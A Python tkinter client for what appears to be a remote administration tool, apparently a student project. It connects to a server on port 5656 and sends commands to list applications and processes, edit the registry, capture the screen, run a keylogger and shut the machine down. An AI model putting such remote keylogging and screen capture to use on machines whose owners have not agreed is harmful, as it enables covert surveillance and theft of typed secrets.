import tkinter as tk
from tkinter import messagebox
import socket
from ClientDesigner import ClientApp
from list import ListApp
from pic import PicApp
from process import ListProcess
from keylogger import Key
from registry import Registry

class Client(ClientApp):
    def __init__(self, root):
        super().__init__(root)
        self.client = None 
        self.ns = None
        self.nr = None
        self.nw = None
        self.pic_app_instance = None 
    
    def connect_server(self):
        try:
            ip = self.txtIP.get()
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(self.client)
            self.client.connect((ip, 5656))
            self.ns = self.client.makefile("rb")
            self.nr = self.client.makefile("r")
            self.nw = self.client.makefile("w")
            messagebox.showinfo("Connected", "Connect successfully")
            print("Listening to server ...")
        except Exception as ex:
            messagebox.showerror("Error", "Can't connect to server: " + str(ex))

    def run_app(self):
        if self.client is None:
            messagebox.showwarning("Warning", "Not connected to the server")
            return
        s = "APPLICATION"
        
        app_instance = ListApp(self.nw, self.nr, self.ns)
        
        self.nw.write(s + "\n")
        self.nw.flush()

    def run_process(self):
        if self.client is None:
            messagebox.showwarning("Warning", "Not connected to the server")
            return
        s = "PROCESS"

        ListProcess(self.nw, self.nr, self.ns)

        self.nw.write(s + "\n")
        self.nw.flush()

    def edit_registry(self):
        if self.client is None:
            messagebox.showwarning("Warning", "Not connected to the server")
            return
        s = "REGISTRY"

        registry_instance = Registry(self.nw, self.nr, self.ns)

        self.nw.write(s + "\n")
        self.nw.flush()

    def screen_capture(self):
        if self.client is None:
            messagebox.showwarning("Warning", "Not connected to the server")
            return
        s = "TAKEPIC"
        
        self.pic_app_instance = PicApp(self.nw, self.nr, self.ns)
        
        self.nw.write(s + "\n")
        self.nw.flush()

    def keylogger(self):
        if self.client is None:
            messagebox.showwarning("Warning", "Not connected to the server")
            return
        s = "KEYLOG"

        key_instance = Key(self.nw, self.nr, self.ns)
        self.nw.write(s + "\n")
        self.nw.flush()

    def shutdown(self):
        if self.client is None:
            messagebox.showwarning("Warning", "Not connected to the server")
            return
        s = "SHUTDOWN"
        self.nw.write(s + "\n")
        self.nw.flush()
        self.client.close()
        self.client = None

    def exit_app(self):
        s = "QUIT"
        if self.client is not None:
            self.nw.write(s + "\n")
            self.nw.flush()
            self.client.close()
        self.root.destroy()


    def client_closing(self):
        s = "QUIT"
        if self.client is not None:
            self.nw.write(s + "\n")
            self.nw.flush()
            self.client.close()
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = Client(root)
    root.mainloop()